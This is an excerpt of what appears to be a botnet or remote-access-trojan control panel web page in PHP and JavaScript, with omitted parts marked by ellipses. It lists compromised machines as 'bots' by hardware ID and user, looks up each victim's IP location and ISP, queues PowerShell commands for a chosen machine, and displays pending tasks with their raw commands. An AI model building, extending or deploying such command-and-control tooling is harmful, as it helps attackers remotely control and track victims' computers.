...
<head>
    ...
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Fira+Code:wght@400;500&family=Audiowide&display=swap" rel="stylesheet">
...
<body>
                    ...
                    <table class="clients-table">
                        ...
                        <tbody id="clientsTableBody">
                            ...
                            <tr data-hwid="<?php echo htmlspecialchars($bot['hwid']); ?>" data-version="<?php echo htmlspecialchars($bot['client_version'] ?? 'v1.0'); ?>">
                                <td><?php echo htmlspecialchars(($bot['user'] ?? 'N/A') === 'N/A' ? $bot['hwid'] : $bot['user']); ?></td>
    ...
    <audio id="notificationBeep" src="uploads/putin.wav" preload="auto"></audio>
    ...
    selectPowershellBtn.addEventListener('click', () => {
        singleCommandType.value = 'powershell';
        singleCommandHwidInput.value = currentSelectedHwid;
    ...
    async function refreshData() {
        try {
            ...
            const ipsToFetch = new Set(data.bots.map(bot => bot.ip));
            const fetchPromises = [];

            for (const ip of ipsToFetch) {
                if (!ipApiData[ip]) {
                    fetchPromises.push(
                        fetch(`http://ip-api.com/json/${ip}?fields=countryCode,city,isp`)
                            .then(res => res.json())
                            .then(json => {
                                ipApiData[ip] = json;
                            })
                            .catch(e => {
                                console.error(`Error fetching IP data for ${ip}:`, e);
                                ipApiData[ip] = { isp: 'N/A', countryCode: 'N/A', city: 'N/A' };
                            })
                    );
                }
            }
            ...
            clientsTableBody.innerHTML = data.bots.map(bot => {
                const ipData = ipApiData[bot.ip] || { isp: 'Loading...', countryCode: 'Loading...', city: 'Loading...' };
                const usernameDisplay = (bot.user === 'N/A' || !bot.user) ? bot.hwid : bot.user;

                const countryCode = ipData.countryCode ? ipData.countryCode.toUpperCase() : 'N/A';
                const city = ipData.city ?? 'N/A';
                const flagUrl = countryCode !== 'N/A' ? `https://flagcdn.com/w20/${countryCode.toLowerCase()}.png` : '';
                const flagImg = countryCode !== 'N/A' ? `<img src="${flagUrl}" class="flag" alt="${countryCode} Flag" onerror="this.onerror=null;this.src='https://placehold.co/20x15/333/FFF?text=?';" />` : '';
            ...
            const tasksHtml = data.pending_tasks.map(task => {
                ...
                if (task.status_message) {
                    ...
                    statusText = task.status_message;
                }

                const commandToDisplay = (task.raw_cmd && task.raw_cmd !== 'null') ? task.raw_cmd : task.cmd;
                const usernameToDisplay = task.username || task.hwid;
    ...
    logoutBtn.addEventListener('click', () => {
        window.location.href = 'authOut.php'; // Redirect to the logout script
    });
    </script>
</body>
</html>
